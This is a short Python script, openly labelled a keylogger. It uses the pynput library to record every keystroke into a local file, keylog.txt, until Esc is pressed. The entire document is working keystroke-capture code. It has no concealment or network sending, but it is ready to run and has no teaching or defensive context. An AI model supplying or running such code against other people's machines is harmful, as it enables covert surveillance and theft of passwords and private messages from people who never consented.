from pynput.keyboard import Key, Listener

# File to save the logged keys
log_file = "keylog.txt"


def on_press(key):
   
    try:
        with open(log_file, 'a') as f:
            f.write(str(key).replace("'", ""))  # Removes quotes around key characters
    except Exception as e:
        print(f"Error writing to log file: {e}")


def on_release(key):
  
    if key == Key.esc:
        # Stop the keylogger when 'Esc' is pressed
        return False


if __name__ == "__main__":
    # Start listening to the keyboard
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
